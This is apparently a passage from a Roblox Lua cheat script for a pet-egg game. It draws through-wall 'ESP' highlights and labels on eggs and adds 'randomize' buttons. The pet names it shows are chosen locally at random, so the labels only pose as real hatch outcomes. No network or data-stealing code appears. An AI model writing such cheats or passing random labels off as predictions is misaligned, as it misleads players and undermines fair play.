        billboard.MaxDistance = 500
        billboard.Parent = basePart

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, 0, 1, 0)
        label.BackgroundTransparency = 1
        label.Text = eggModel.Name .. " | " .. petName
        if not hatchReady then
            label.Text = eggModel.Name .. " | " .. petName .. " (Not Ready)"
            label.TextColor3 = Color3.fromRGB(160, 160, 160)
            label.TextStrokeTransparency = 0.5
        else
            label.TextColor3 = Color3.new(1, 1, 1)
            label.TextStrokeTransparency = 0
        end
        label.TextScaled = true
        label.Font = Enum.Font.FredokaOne
        label.Parent = billboard

        glitchLabelEffect(label)

        local highlight = Instance.new("Highlight")
        highlight.Name = "ESPHighlight"
        highlight.FillColor = Color3.fromRGB(255, 200, 0)
        highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
        highlight.FillTransparency = 0.7
        highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
        highlight.Adornee = eggModel
        highlight.Parent = eggModel
    end

    local function removeEggESP(eggModel)
        local label = eggModel:FindFirstChild("PetBillboard", true)
        if label then label:Destroy() end
        local highlight = eggModel:FindFirstChild("ESPHighlight")
        if highlight then highlight:Destroy() end
    end

    local function getPlayerGardenEggs(radius)
        local eggs = {}
        local char = player.Character
        if not char then
            char = player.CharacterAdded:Wait()
        end
        
        local root = char:WaitForChild("HumanoidRootPart", 5)
        if not root then 
            warn("HumanoidRootPart not found!")
            return eggs 
        end

        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("Model") and petTable[obj.Name] then
                local dist = (obj:GetModelCFrame().Position - root.Position).Magnitude
                if dist <= (radius or 60) then
                    if not truePetMap[obj] then
                        local pets = petTable[obj.Name]
                        local chosen = pets[math.random(1, #pets)]
                        truePetMap[obj] = chosen
                    end
                    table.insert(eggs, obj)
                end
            end
        end
        return eggs
    end

    local function randomizeNearbyEggs()
        local eggs = getPlayerGardenEggs(60)
        for _, egg in ipairs(eggs) do
            local pets = petTable[egg.Name]
            local chosen = pets[math.random(1, #pets)]
            truePetMap[egg] = chosen
            applyEggESP(egg, chosen)
        end
        print("Randomized", #eggs, "eggs.")
    end

    local function flashEffect(button)
        local originalColor = button.BackgroundColor3
        for i = 1, 3 do
            button.BackgroundColor3 = Color3.new(1, 1, 1)
            wait(0.05)
            button.BackgroundColor3 = originalColor
            wait(0.05)
        end
    end

    local function countdownAndRandomize(button)
        for i = 10, 1, -1 do
            button.Text = "🎲 Randomize in: " .. i
            wait(1)
        end
        flashEffect(button)
        randomizeNearbyEggs()
        button.Text = "🎲 Randomize Pets"
    end

    -- Connect Egg Randomizer buttons
    local eggContent = tabContents["Egg Randomizer"]
    if eggContent then
        local randomizeBtn = eggContent:FindFirstChild("RandomizeButton")
        local toggleBtn = eggContent:FindFirstChild("ToggleButton")
        local autoBtn = eggContent:FindFirstChild("AutoButton")
        
        if randomizeBtn then
            randomizeBtn.MouseButton1Click:Connect(function()
                if Activate then
                    countdownAndRandomize(randomizeBtn)
                end
            end)
        end
        
        if toggleBtn then
            toggleBtn.MouseButton1Click:Connect(function()
                if Activate then
                    espEnabled = not espEnabled
                    toggleBtn.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
           for _, egg in pairs(getPlayerGardenEggs(60)) do
                        if espEnabled then
                            applyEggESP(egg, truePetMap[egg])
                        else
                            removeEggESP(egg)
                        end
                    end
                end
            end)
        end
        
        if autoBtn then
            autoBtn.MouseButton1Click:Connect(function()
                if Activate then
                    autoRunning = not autoRunning
                    autoBtn.Text = autoRunning and "🔁 Auto Randomize: ON" or "🔁 Auto Randomize: OFF"
                    coroutine.wrap(function()
                        while autoRunning do
                            countdownAndRandomize(randomizeBtn)
                            for _, petName in pairs(truePetMap) do
                                if bestPets[petName] then
                                    autoRunning = false
                                    autoBtn.Text = "🔁 Auto Randomize: OFF"
                                    return
                                end
                            end
                            wait(1)
                        end
                    end)()
                end
            end)
        end
    end

    -- Initialize ESP for existing eggs after character loads
    local function initESP()
        -- Wait for character to load
        local char = player.Character
        if not char then
            player.CharacterAdded:Wait()
            char = player.Character
        end
        
        -- Wait for HumanoidRootPart
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then
            char.ChildAdded:Wait()
            root = char:WaitForChild("HumanoidRootPart", 5)
        end
        
        if not root then
            warn("HumanoidRootPart not found after waiting!")
            return
        end
        
        -- Initialize ESP
        for _, egg in ipairs(getPlayerGardenEggs(60)) do
            if not truePetMap[egg] then
                local pets = petTable[egg.Name]
                if pets then
                    truePetMap[egg] = pets[math.random(1, #pets)]
                    applyEggESP(egg, truePetMap[egg])
                end
            end
        end
        print("ESP initialized for nearby eggs")
    end

    -- Initialize ESP in a coroutine after a short delay
    coroutine.wrap(function()
        wait(3)  -- Wait for everything to load
        pcall(initESP)  -- Protected call to prevent errors
    end)()

    print("GUI initialized successfully")
end, logError)

if not success then
    warn("Critical error during initialization: " .. err)
end
